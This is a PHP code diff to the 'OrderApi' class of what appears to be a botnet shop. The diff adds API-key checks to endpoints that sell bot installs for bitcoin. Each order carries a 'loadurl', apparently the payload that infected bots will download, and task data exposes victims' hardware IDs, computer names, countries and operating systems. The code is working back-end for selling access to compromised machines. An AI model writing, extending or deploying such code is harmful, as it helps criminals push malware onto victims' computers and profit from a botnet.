@@ -38,6 +38,17 @@ class OrderApi
         }
     }
 
+
+    private function checkApi(){
+        $login = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access WHERE apikey = ? AND active = 1");
+        $login->execute(array($_POST["apikey"]));
+        $access = $login->fetch();
+        if($access == false){
+            //BruteForce Handler?
+            die("Wrong API");
+        }
+    }
+
     function command_exist($cmd)
     {
         $return = shell_exec(sprintf("which %s", escapeshellarg($cmd)));
@@ -59,14 +70,14 @@ class OrderApi
         return $randomString;
     }
 
-    private function generateOrder($type, $bots,$loadurl)
+    private function generateOrder($type, $bots,$loadurl,$apikey)
     {
         $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
         $usd = $this->botsToUSD($bots);
         $userAuthkey = md5($this->generateRandomString(30));
         $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
-        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
-        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey));
+        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)");
+        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey));
         return array(
             "address" => $bitcoinAddress["address"],
             "coinsToPay" => $coinsToPay,
@@ -98,6 +109,7 @@ class OrderApi
     }
 
     public function detils(){
+        $this->checkApi();
         $address = $_POST["userauthkey"];
         $statement = $GLOBALS["pdo"]->prepare("SELECT *,tasks.id as taskidsure FROM botshop_orders  LEFT JOIN tasks ON tasks.id = botshop_orders.taskid WHERE botshop_orders.userauthkey = ? AND botshop_orders.payed = 1");
         $statement->execute(array($address));
@@ -107,7 +119,6 @@ class OrderApi
             echo json_encode(array("order"=>"notpayed"));
             die();
         }
-
 
         if($_POST["type"] == "taskData"){
             $statement = $GLOBALS["pdo"]->prepare("SELECT   tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
@@ -147,7 +158,9 @@ class OrderApi
     }
 
 
+
     public function checkorder(){
+        $this->checkApi();
         $address = $_POST["userauthkey"];
 
         $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE userauthkey = ?");
@@ -184,17 +197,17 @@ class OrderApi
     public function checkFunctions()
     {
         //  echo $this->checkAmount("2MtmwAVzoDcjR9S41SDpAhkbEBJES551ERv",1);
-        $infos = $this->generateOrder("btc",$_POST["amount"]);
-        echo json_encode($infos);
+       // $infos = $this->generateOrder("btc",$_POST["amount"]);
+       // echo json_encode($infos);
         die();
     }
 
     public function createoder(){
-        $infos = $this->generateOrder("btc",$_POST["amount"],$_POST["loadurl"]);
+        $this->checkApi();
+        $infos = $this->generateOrder("btc",$_POST["amount"],$_POST["loadurl"],$_POST["apikey"]);
         echo json_encode($infos);
         die();
     }
-
 
 }
 
